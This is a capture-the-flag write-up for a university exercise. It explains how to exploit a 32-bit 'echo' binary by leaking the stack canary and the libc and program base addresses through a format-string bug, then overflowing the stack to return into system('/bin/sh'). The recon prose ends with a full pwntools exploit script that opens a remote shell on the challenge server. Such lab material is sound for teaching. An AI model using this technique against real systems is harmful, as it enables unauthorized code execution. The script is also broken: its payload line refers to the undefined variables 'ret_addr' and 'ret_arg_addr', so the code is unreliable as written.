# Echo Challenge

## Recon

In this challenge, we are given an executable that, when executed, prompts us with a choice. If we select the "echo your input" choice, we will be asked for a name (up to a maximum of 20 characters) and a message.

### Protections

Analyzing its protections using `checksec program`, we see the following:

```
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

This gives us some important pieces of information:

1. The executable's architecture is 32 bits and little-endian.
2. Full RELRO is enabled, meaning that we can't perform a GOT overwrite attack.
3. Stack canaries are enabled.
4. NX is enabled and, therefore, we won't be able to execute code from the stack, for instance.
5. PIE is enabled.

### Testing vulnerabilities

Now that we have an overview of the program's protections, we can start testing vulnerabilities to see if they work.

Since we have most protections enabled, we will first test for the presence of a format string vulnerability, since it's a very powerful vulnerability that can enable us to overwrite any memory address.

![First attempt at exploiting a Format String Vulnerability](/images/echo/vulnerability-testing/1.png)
![Second attempt at exploiting a Format String Vulnerability](/images/echo/vulnerability-testing/2.png)
![Third attempt at exploiting a Format String Vulnerability](/images/echo/vulnerability-testing/3.png)

As you can see, the only field vulnerable to a format string vulnerability is the name field.

Another thing we can see about the name field is that it can hold far more than 20 characters.

![Length of the name buffer](/images/echo/name-size-deduction.png)

As you can see, it can hold up to 99 characters + 1 for the null-byte terminator. This will be useful since it means that we will be able to use longer format strings. However, when more than 19 characters are used, when exiting the program later, a stack smash will be detected because the stack canary is overwritten. With this information, we can infer that the allocated memory is only 20 bytes long and, after that, a buffer overflow will occur.

### Program's address space

By executing `readelf -s program`, we can find out a few interesting things.

```
...

Symbol table '.symtab' contains 80 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
    ...
    16: 00001170     0 SECTION LOCAL  DEFAULT   16 .text
    ...
    25: 00004000     0 SECTION LOCAL  DEFAULT   25 .data
    26: 00004020     0 SECTION LOCAL  DEFAULT   26 .bss
    27: 00000000     0 SECTION LOCAL  DEFAULT   27 .comment
    28: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    ...
    59: 00004040   100 OBJECT  GLOBAL DEFAULT   26 buffer
    ...
    74: 000012ad   406 FUNC    GLOBAL DEFAULT   16 main
    ...
```

1. There is no function to launch a shell, it seems it's just `main` and libc's functions :(
2. There is a global variable called `buffer` with a size of 100 bytes (we know that it's a global variable because it's in the `bss` section of the program) :eyes:

So far, it has become obvious that we can't do an attack where we write assembly instructions to memory and use a `jmp` to execute them since no segment in the executable is both writable and executable.
Another obvious thing is that we can't perform the same attack as in the FinalFormat challenge (GOT overwrite), since the GOT is non-writable.

This means that our only viable option is to use ROP. The difficulty comes from the fact that stack canaries are present, however, if we can leak the canary, we can bypass that protection. That way, when we select the option to exit the program and `main` returns, it will execute any code we want within the program's address space or libc's address space.

### Debugging

Now that we have all that information, debugging the program should be relatively easy.

Since PIE is enabled, the first thing we want to know is the virtual memory map of the program, since this is likely to change across executions. To that end, we will execute `info proc mappings` once the debug session starts.

> Note: to start the debug session, you should execute the following command:
>
> `LD_LIBRARY_PATH=$PWD gdb program`
> 
> so that the provided `libc.so.6` is loaded instead of your system's.

![Virtual memory map for the session](/images/echo/debugging/vmmap.png)

As you can see, for this debug session, the executable's address space starts at `0x56555000` and ends at `0x5655a000`. libc's address space starts at `0xf7d8b000` and ends at `0xf7fb6000`.

When we were asked the name, this was the state of the process

![State of the process at name fgets](/images/echo/debugging/fgets-name.png)

As you can see, in the stack, we can see the arguments to `fgets`.

As we discovered previously, the number of characters read for the name is indeed 100 (`+0x0004: 0x000064`, 0x64 = 100), with the null-byte terminator included.
Furthermore, we see that the address where the name will be written is `0xffffc99c`, which is on the stack.

After stepping over some instructions, we reached the point where a message was asked and this was the state of the process at that time

![State of the process at message fgets](/images/echo/debugging/fgets-message.png)

Again, inspecting the arguments in the stack, we can see that, again, 100 characters are read (including the null-byte terminator). This time, however, the address where the message will be written is `0x56559040`, which is in the program's address space.
If we calculate it's offset relative to the start of the address space, we will see that it's `0x56559040 - 0x56555000 = 0x4040`. That address is the address of `buffer`, as seen previously.

:warning: This means that the message we provide gets written to a global variable.

With this information, a potential exploit would be overwriting the return address with the address of the `system` function, for instance, and calling it with `buffer` as its argument. If we provided `/bin/sh` as the message beforehand, a shell will be created and we will then be able to read the flag.

To overwrite the return address of `main`, we will need to exploit the buffer overflow on the name field. However, we need to defeat the stack canary, otherwise, the program will crash when returning. Therefore, the next step is leaking the stack canary.

#### Leaking the canary

In order to leak the canary, we will need to read values from the stack. As such, the most suitable spot to do it is in the name field, with the help of a format string vulnerability.

With the help of gef, a popular gdb plugin, we can see the value of the stack canary for a given process. Then we can search the stack at the point `printf` for the name field is called and determine the offset at which the canary is located.

![The canary in the stack](/images/echo/canary-leak/1.png)

> Note: in GEF, `telescope` is an alias for `dereference`

As we can see, the canary for this process is `0x8cdeb100` and it is located at an offset of `+0x0020`. Therefore, since `0x0020 / 4 = 32 / 4 = 8`, using `%8$x` should be enough to leak the stack canary.
We can test this by executing the program and, later, attaching gdb to it to check if the stack canary is correct or not.

> To attach gdb to a running program, we used the command
>
> `LD_LIBRARY_PATH=$PWD gdb program <PID>`
>
> where `<PID>` is the PID of the running process.

![Finally leaking the canary](/images/echo/canary-leak/2.png)

#### Changing the return address

After getting the canary, our next job is overwriting the return address, while preserving the canary.
We still need to determine the return address, however. In this exploit, we will be returning to the function `system`.

To determine the address of `system`, we will use `readelf -s libc.so.6 | grep system`.

```
2166: 00048150    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
```

This means that the address of `system`, relative to the start of libc, is `0x00048150`.
Therefore, in our debug session, the address of `system` will be `0xf7d8b000 + 0x00048150 = 0xf7dd3150`.

![Assembly code at 0xf7dd3150](/images/echo/rop/system-address.png)

However, since PIE is enabled, the use of the address `0xf7d8b000` is not reliable. Instead, we need to find a libc address on the stack, so that we can, from there, calculate the base address of libc. To that end, we can exploit the fact that the `main` function returns to a libc address.

![Stack with the return address of main](/images/echo/canary-leak/1.png)

Looking at the image from earlier, we can see that, at the point `printf` for the name field is called, the return address of `main` is located one address after `$ebp`, at an offset of `0x+0x002c = 44`, therefore, using the format string `%11$x` should be enough to leak that address. Since we know libc's base address in this session is `0xf7d8b000`, we can calculate the offset to subtract to the leaked address to be `0xf7dac519 - 0xf7d8b000 = 0x00021519`.

Now that we can determine the address of the `system` function, we need to get the address of `buffer`, so that we can use it as an argument to the call.

The `buffer` variable is located in the program's address space. As such, we need to leak the base address of program's address space, similarly to what we did with libc.
Using the same image of the stack from before, we can see that, the address of `main` is located at offset `+0x0044` (68 in decimal). Therefore, in order to leak it, the format string `%17$x` can be used. After that, we can subtract the start address of program's address space in this debug session from it to get the offset that we need to subtract to the address leaked in the attack.
As such, the offset is `0x565562ad - 0x56555000 = 0x000012AD`

With all this information, we are now fully prepared to overwrite the return address and to write the arguments to the `system` function call.

This is the stack at the point the `fgets` for the name field is called.

![Stack when fgets is called](/images/echo/rop/stack-fgets.png)

As you can see, the address where the input will be written to in this process is `0xffffc99c`. Therefore, if we dump the stack at that address, we can see that we will have to, at `0x20 = 32 bytes`, overwrite the return address and, at `0x24 = 36 bytes`, overwrite the argument for the `system` function call. In the middle, at `0x14 = 20 bytes`, we will have to write the canary so that it doesn't change (the canary has changed because we had to restart the session, however, that has no impact in this section).

## Exploitation

Recalling all information we gathered during the Recon phase, we've developed the following exploit.

```py
from pwn import *

def leak_canary(proc):
    """Returns the canary of the process as a 32-bit integer."""
    payload = b"%8$x"
    proc.sendlineafter(b">", b"e")
    proc.sendlineafter(b":", payload)
    canary = proc.recvline(keepends=False)
    proc.sendlineafter(b":", b"")
    return int(canary, 16)

def leak_main_addr(proc):
    """Returns the address of main as a 32-bit integer."""
    payload = b"%17$x"
    proc.sendlineafter(b">", b"e")
    proc.sendlineafter(b":", payload)
    addr = proc.recvline(keepends=False)
    proc.sendlineafter(b":", b"")
    return int(addr, 16)

def leak_libc_addr(proc):
    """Returns the base address of libc as a 32-bit integer."""
    payload = b"%11$x"
    proc.sendlineafter(b">", b"e")
    proc.sendlineafter(b":", payload)
    addr = proc.recvline(keepends=False)
    proc.sendlineafter(b":", b"")
    return int(addr, 16)
    
r = remote("ctf-fsi.fe.up.pt", 4002)


canary = leak_canary(r)
info(f"Canary leaked!\n! {hex(canary)}")

main_addr = leak_main_addr(r)
program_base_addr = main_addr - 0x000012AD
info(f"Program base address leaked!\n! {hex(program_base_addr)}")
buffer_addr = program_base_addr + 0x00004040

libc_addr = leak_libc_addr(r)
libc_base_addr = libc_addr - 0x00021519
info(f"Libc base address leaked!\n! {hex(libc_base_addr)}")
system_addr = libc_base_addr + 0x00048150

info(f"Ret addr: {hex(system_addr)}")
info(f"Ret arg addr: {hex(buffer_addr)}")
payload = b"A" * 20 + p32(canary) + b"\0" * 8 + p32(ret_addr) + b"\0" * 4 + p32(ret_arg_addr)
info(f"Payload: {payload}")

r.sendlineafter(b">", b"e")
r.sendlineafter(b":", payload)
r.sendlineafter(b":", b"/bin/sh\0")

r.interactive()
```

After having executing the script, an interactive shell on the machine will be available.
Then, just execute `cat flag.txt` to get the flag!
